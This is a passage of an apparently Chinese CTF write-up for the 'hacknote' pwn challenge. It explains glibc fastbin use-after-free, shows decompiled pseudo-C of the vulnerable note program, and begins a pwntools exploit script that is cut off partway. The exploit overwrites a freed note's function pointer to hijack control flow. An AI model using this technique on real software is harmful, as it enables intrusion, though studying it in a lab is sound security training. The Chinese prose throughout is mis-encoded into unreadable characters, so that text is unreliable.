Attackæ˜¯fastbinåœ¨å­˜å‚¨ç®¡ç†æ—¶ï¼Œä¸ºä¿è¯å¿«é€Ÿåˆ†é…ï¼Œå›æ”¶å†…å­˜çš„éœ€è¦ï¼Œåœ¨å†…å­˜ç®¡ç†çš„æœºåˆ¶ä¸­å‡ºç°çš„é—®é¢˜ï¼Œè¿›è€Œé€ æˆçš„æ¼æ´ï¼Œèƒ½å¤Ÿé€šè¿‡æ¼æ´æ”¹å†™main_arenaä¸Šçš„FasbinYæŒ‡é’ˆæ•°ç»„ï¼Œä»è€Œè·å¾—â€œç‰¹å®šâ€ï¼ˆéœ€è¦æ»¡è¶³ä¸€å®šæ¡ä»¶ï¼‰åœ°å€çš„å†™æƒé™ã€‚</p><p>è‡³äºmain_arenaï¼Œå°±å¼•ç”¨ä¸€ä¸‹stackoverflowçš„è§£é‡Šå’¯ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102215928.png" alt=""></p><p><code>main_arena</code> is a local symbol and is specifically <strong>not exported</strong>. the list of exported symbols is controlled via the <code>Version</code> files in the glibc source tree. this is, by design, to keep people from being able to link against random symbols that glibc uses internally (so as to not pollute the namespace as is required by POSIX and other standards).</p><blockquote><p>main_arenaæ˜¯ä¸èƒ½å¯¼å‡ºçš„ä¸€ä¸ªæœ¬åœ°ç¬¦å·è¡¨ã€‚å¯¼å‡ºç¬¦å·åˆ—è¡¨éœ€è¦é€šè¿‡glibcæºä»£ç ç›®å½•ä¸­çš„Versionæ–‡ä»¶æ§åˆ¶ã€‚è¿™æ˜¯è®¾è®¡ç”¨äºé˜²æ­¢äººä»¬é“¾æ¥glibcå†…éƒ¨ä½¿ç”¨çš„éšæœºç¬¦å·ï¼Œï¼ˆæ‰€ä»¥ä¸ä¼šåƒPOSIXå’Œå…¶ä»–æ ‡å‡†é‚£æ ·æ±¡æŸ“å‘½åç©ºé—´ï¼‰ã€‚</p></blockquote><p>gdb can find it because you have debug symbols available â€¦ either the C lib is not stripped, or you have the split debug symbols in <code>/usr/lib/debug/</code> and gdb is finding those. when you launch gdb, it will tell you things like <code>Reading symbols from /usr/lib/debug/xxxxx</code>.</p><blockquote><p>gdbå¯ä»¥æ‰¾åˆ°main_arenaï¼Œå› ä¸ºä½ å¯ä»¥è·å¾—ä¸€äº›è°ƒè¯•ç¬¦å·è¡¨â€¦å½“ç¨‹åºæ²¡æœ‰è¢«è„±è¡£æœ(not stripped)ï¼Œæˆ–è€…ä½ åœ¨<code>/ usr / lib / debug /</code>ä¸­æ‹†åˆ†è¿‡è°ƒè¯•ç¬¦å·ï¼Œè€Œgdbå¯ä»¥æ‰¾åˆ°å®ƒä»¬ã€‚å½“ä½ å¯åŠ¨gdbè¿›è¡Œè°ƒè¯•æ—¶ï¼Œå®ƒä¼šæ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯ï¼Œä¾‹å¦‚<code>loading symbols from / usr / lib / debug / xxxxx</code>è¿™ç§è°ƒè¯•ä¿¡æ¯ã€‚</p></blockquote><p>the only way to be able to link against the symbol is to rebuild glibc from source and modify the export list.</p><blockquote><p>å”¯ä¸€èƒ½å¤Ÿé“¾æ¥åˆ°ç¬¦å·çš„æ–¹æ³•æ˜¯ä»æºé‡æ„GLIBCå¹¶ä¿®æ”¹å¯¼å‡ºåˆ—è¡¨ã€‚</p></blockquote><p>alternatively, you could write some code in your app to behave like gdb. namely, open the debug file, process the ELF/DWARF information in it, apply relocations using the active loaded library info (see <code>dl_iterate_phdr</code>), and then just start poking memory directly.</p><blockquote><p>æˆ–è€…ï¼Œä½ å¯ä»¥åœ¨ä½ çš„åº”ç”¨ç¨‹åºä¸­ç¼–å†™ä¸€äº›ä»£ç æ¥åƒgdbè°ƒè¯•ä¸€æ ·ã€‚å³é€šè¿‡åº”ç”¨ç¨‹åºï¼Œæ‰“å¼€è°ƒè¯•æ–‡ä»¶ï¼Œå¤„ç†å…¶ä¸­çš„ELF / DWARFä¿¡æ¯ï¼Œä½¿ç”¨æ´»åŠ¨åŠ è½½çš„åº“ä¿¡æ¯åº”ç”¨é‡å®šä½ï¼ˆè¯·å‚é˜…dl_iterate_phdrï¼‰ï¼Œç„¶åç›´æ¥å¼€å§‹è°ƒç”¨å†…å­˜ã€‚</p></blockquote><p>if thatâ€™s too much work, a hackery solution might be to <code>fork()</code>+<code>popen()</code> gdb against your own process and run it in batch mode to dump symbol info.</p><blockquote><p>å¦‚æœé‚£å¤ªè¿‡äºéº»çƒ¦ï¼Œé»‘å®¢ä¸€ç‚¹çš„è§£å†³æ–¹æ¡ˆå¯èƒ½æ˜¯<code>forkï¼ˆï¼‰+ popenï¼ˆï¼‰</code>gdbè°ƒè¯•ä½ è‡ªå·±çš„è¿›ç¨‹ï¼Œå¹¶ä»¥æ‰¹å¤„ç†æ¨¡å¼è¿è¡Œå®ƒæ¥è½¬å‚¨ç¬¦å·ä¿¡æ¯ã€‚</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">;</span>FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span><span class="token function">asprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cmd<span class="token punctuation">,</span> <span class="token string">"gdb -q -p %i -batch -ex 'p &amp;main_arena'"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fp <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// parse the output of |fp| here looking for the address.</span><span class="token function">free</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></blockquote><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p>é‚£ä¹ˆå¼€å§‹åšé¢˜å§ï¼Œå…ˆchecksec:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102203217.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå¼€å¯äº†æ ˆæº¢å‡ºä¿æŠ¤ä»¥åŠæ ˆä¸å¯æ‰§è¡Œï¼Œé‚£ä¹ˆè¿™é¢˜å¾ˆæ˜æ˜¾å°±æ˜¯è®©æˆ‘ä»¬ä»åˆ«çš„åœ°æ–¹å…¥æ‰‹ã€‚</p></blockquote><h3 id="é€»è¾‘åˆ†æ"><a href="#é€»è¾‘åˆ†æ" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote><p>å…ˆç®€å•è¿è¡Œä¸€ä¸‹ç¨‹åºï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102203545.png" alt=""></p><p>è¿™ç§noteç±»é¢˜ç›®å¯ä»¥è¯´æ˜¯æ¯”è¾ƒå¸¸è§äº†ã€‚ã€‚ã€‚å³ä½¿æˆ‘ä¸æ˜¯pwnå¸ˆå‚…ï¼Œæˆ‘ä¹Ÿé‡åˆ°è¿‡å¾ˆå¤šæ¬¡ï¼Œå½“ç„¶æ˜¯ä¸€è„¸æ‡µé€¼äº†ï¼ŒğŸ˜­ã€‚</p></blockquote><p>é€šè¿‡IDAé™æ€åˆ†æmainå‡½æ•°ï¼Œå¯ä»¥å¾—åˆ°ä¸‹é¢çš„ä¼ªCä»£ç ï¼š</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//mainå‡½æ•°</span><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">//èœå•</span>      <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v3 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">del_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//åˆ é™¤æŒ‡å®šå¯¹è±¡</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token function">print_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//æ‰“å°å¯¹è±¡</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>LABEL_13<span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token keyword">goto</span> LABEL_13<span class="token punctuation">;</span>      <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//æ·»åŠ note</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>çœ‹çœ‹addå‡½æ•°ï¼š</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//add_note</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  _DWORD <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-1Ch]</span>  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-18h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-14h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> count <span class="token operator">&lt;=</span> <span class="token number">5</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//å…ˆä¸ºnotelistç”³è¯·8å¤§å°çš„ç©ºé—´</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> print_note_content<span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Note size :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        size <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        v0 <span class="token operator">=</span> notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        v0<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//å†ä¸ºè¾“å…¥çš„å†…å®¹ï¼ˆcontentï¼‰ç”³è¯·ç©ºé—´</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è¯»å–å†…å®¹</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">++</span>count<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>deleteå‡½æ•°:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">del_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> count <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//å…ˆfreeæ‰content</span>    <span class="token function">free</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//å†freeè‡ªå·±</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>print_note:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">print_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> count <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>è¿˜å¯ä»¥çœ‹åˆ°ä¸€ä¸ª<code>magicï¼ˆaddr = 0x08048986)</code>å‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°å°±æ˜¯æˆ‘ä»¬çš„ç›®æ ‡å“¦ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102205533.png" alt=""></p><blockquote><p> è§£é¢˜é€»è¾‘ï¼šé€šè¿‡ä¸Šé¢å¯¹fastbinï¼Œuafçš„äº†è§£åï¼Œå¤§æ¦‚å¯ä»¥ç†è§£è¿™ä¸ªé¢˜ç›®çš„è§£é¢˜æ–¹æ³•äº†ã€‚æˆ‘ä»¬é¦–å…ˆè¦æ˜ç™½mallocå’Œfreeæœºåˆ¶ï¼Œå…ˆè¢«freeæ‰çš„å—ä¼šå¾ˆå¿«è¢«åº”ç”¨äºæ–°çš„mallocï¼Œå‰ææ˜¯å¤§å°åˆé€‚ï¼Œä¾‹å¦‚<code>free v1; v2 = malloc(4)</code>ï¼Œå¦‚æœåŸæ¥v1çš„å¤§å°ä¹Ÿä¸º4ï¼Œé‚£ä¹ˆv1åŸæ¥çš„é‚£å—å†…å­˜å°±ä¼šè¢«åˆ†é…ç»™v2ï¼Œé€šè¿‡v1å¯ä»¥ï¼ˆuafï¼‰è®¿é—®v2çš„å†…å®¹ã€‚</p><p>Fï¼ŒAï¼ŒUï¼ˆå…ˆFREE,å†ä¿®æ”¹chunkï¼Œè°ƒç”¨chunkä¸­çš„å‡½æ•°æŒ‡é’ˆï¼‰ã€‚è®©ä¸¤ä¸ªæŒ‡é’ˆå®é™…æŒ‡å‘åŒä¸€ä¸ªchunkï¼Œä¸€ä¸ªæŒ‡é’ˆæŠŠå†…å­˜è§£é‡Šä¸ºå­—ç¬¦ä¸²ï¼Œä»è€Œå†™å…¥ä»»æ„å€¼ï¼Œå¦ä¸€ä¸ªæŒ‡é’ˆæŠŠå†…å­˜è§£é‡Šä¸ºå‡½æ•°æŒ‡é’ˆï¼Œä»è€Œæ§åˆ¶äº†EIPã€‚</p></blockquote><h3 id="æ„é€ EXP"><a href="#æ„é€ EXP" class="headerlink" title="æ„é€ EXP"></a>æ„é€ EXP</h3><p>å€Ÿé‰´veritas501å¸ˆå‚…çš„EXPï¼Œç¨åŠ ä¿®æ”¹å’Œç†è§£ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span>bin <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#æ·»åŠ </span><span class="token keyword">def</span> <span class="token function">add_note</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#åˆ é™¤â€”â€”free</span><span class="token keyword">def</span> <span class="token function">del_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#æ‰“å°</span><span class="token keyword">def</span> <span class="token function">print_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" 